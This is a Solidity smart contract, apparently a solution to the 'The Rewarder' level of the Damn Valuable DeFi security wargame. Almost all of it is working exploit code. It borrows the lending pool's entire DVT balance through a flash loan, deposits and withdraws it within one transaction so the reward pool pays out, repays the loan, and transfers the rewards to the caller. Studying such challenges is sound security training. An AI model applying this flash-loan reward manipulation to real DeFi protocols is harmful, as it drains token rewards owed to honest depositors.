// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RewarderHack {
    FlashLoanerPool public pool;
    DamnValuableToken public dvtToken;
    TheRewarderPool public rPool;
    RewardToken public reward;

    constructor(
        address _flPool,
        address _dvtToken,
        address _rPool,
        address _reward
    ) {
        pool = FlashLoanerPool(_flPool);
        dvtToken = DamnValuableToken(_dvtToken);
        rPool = TheRewarderPool(_rPool);
        reward = RewardToken(_reward);
    }

    // We then execute below code in the fallback function
    fallback() external {
        // get the balance of DVT token in this contract
        uint256 bal = dvtToken.balanceOf(address(this));

        // Approve the reward pool to spend the DVT tokens
        dvtToken.approve(address(rPool), bal);
        rPool.deposit(bal);
        rPool.withdraw(bal);

        // We send the balance back to the flash loan pool so the "flashLoan" function
        // can finish executing
        dvtToken.transfer(address(pool), bal);
    }

    function attack() public {
        // During the process of getting the flashLoan,
        // the FlashLoan contract will call the receiveFlashLoan function in this contract
        // as that function doesn't exist, it will then fallback to the fallback function above
        pool.flashLoan(dvtToken.balanceOf(address(pool)));

        // finally, we will transfer the reward of this contract to our address
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}
